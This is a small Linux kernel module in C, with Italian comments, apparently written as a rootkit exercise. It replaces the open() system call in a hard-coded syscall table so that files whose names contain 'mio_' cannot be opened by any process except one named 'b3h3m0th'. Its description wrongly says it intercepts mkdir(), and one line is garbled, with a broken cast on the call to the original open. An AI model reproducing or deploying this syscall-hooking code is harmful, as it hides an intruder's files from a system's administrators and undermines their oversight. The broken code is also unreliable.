#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/sys.h>

#define MODULE_NAME	THIS_MODULE->name
#define SYS_CALL_ADDRESS	0xc000a964 /* (kernel 2.6.39-2) PPC */
void **sys_call_table = (void **)SYS_CALL_ADDRESS;

MODULE_LICENSE("GPL");
MODULE_AUTHOR("B3h3m0th");
MODULE_DESCRIPTION("intrecettazione della syscall mkdir()");
MODULE_VERSION("0.1");

char hide[] = "mio_";

/* Un puntatore alla system call originale */
asmlinkage int (*original_open)(char *path, int flags, int mode);

asmlinkage int *new_open(char *path, int flags, int mode)
{
   if ( strstr(path, hide) && strcmp(current->comm, "b3h3m0th")) {
      return -1;
   }
   
   return (intoriginal_open(path, flags, mode);
}

/* funzione di inizializzazione del modulo */
static int __init insert_mod(void)
{
   printk(KERN_ALERT "[%s] init\n", MODULE_NAME);
   
   original_open = sys_call_table[__NR_open];
   sys_call_table[__NR_open] = new_open;
   return 0;
}

/* funzione di uscita e pulizia del modulo */
static void __exit remove_mod(void)
{
   printk(KERN_ALERT "[%s] exit\n", MODULE_NAME);
   
   sys_call_table[__NR_open] = original_open;
}

module_init(insert_mod);
module_exit(remove_mod);
